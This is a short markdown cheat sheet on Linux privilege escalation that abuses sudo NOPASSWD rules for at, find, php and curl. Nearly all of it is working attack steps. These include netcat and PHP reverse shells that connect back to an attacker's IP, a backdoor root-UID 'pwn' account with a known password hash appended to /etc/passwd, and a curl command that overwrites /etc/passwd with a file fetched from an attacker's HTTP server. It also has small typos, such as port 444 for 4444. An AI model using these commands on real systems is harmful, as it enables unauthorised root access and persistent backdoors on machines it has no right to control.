# Linux Privilege Escalation

## 1. /usr/bin/at

```
(root) NOPASSWD: /usr/bin/at
```
  **Attacker's machine** 
  
  - start listner on port 4444 using netcat ```nc -nvlp 444```
  
  **Victim's machine** 
  
  - create a bash script which contain this command ```nc 192.168.0.106 4444 -e /bin/bash``` and 
  - run ```sudo at -f exp.sh now + 1 minutes```
  
## 2. /usr/bin/find

```
(root) NOPASSWD: /usr/bin/find
```
  **Victim's machine**
  
  - sudo find /etc/passwd -type f -name "passwd" -exec nano "{}" \;
  - add this line at the find of the file ```pwn:$1$pwn$AxNbnbaujRUXRur/DewJ8/:0:0:/root/root:/bin/bash``` and save it
  - change user to **pwn** using password **pwn** ```su pwn``` 
  
## 3. /usr/bin/php

```
root) NOPASSWD: /usr/bin/php
```
  **Attacker's machine**
  
  - start listner on port 1234 using netcat ```nc -nvlp 1234```
  
  **Victim's machine**
  
  - run this command and replace <IP> with your IP ```echo "<?php shell_exec('nc <IP> 1234 -e /bin/sh');?>" > shell.php```
  - sudo php shell.php

## 4. /usr/bin/curl

```
root) NOPASSWD: /usr/bin/curl
```

  **Attacker's machine**
  
  - Copy /etc/passwd from victim's machine and save it on attacker's machine as pass.txt
  - add this line at this end of the file ```pwn:$1$pwn$AxNbnbaujRUXRur/DewJ8/:0:0:/root/root:/bin/bash```
  - start http server using python ```python -m SimpleHTTPServer 8080``` and note the IP
  
  **Victim's machine**
  
  - run this command ( replace <IP> with your IP) ```sudo curl http://<IP>:8080/pass.txt -o /etc/passwd```
  - change user to **pwn** using password **pwn** ```su pwn```
  
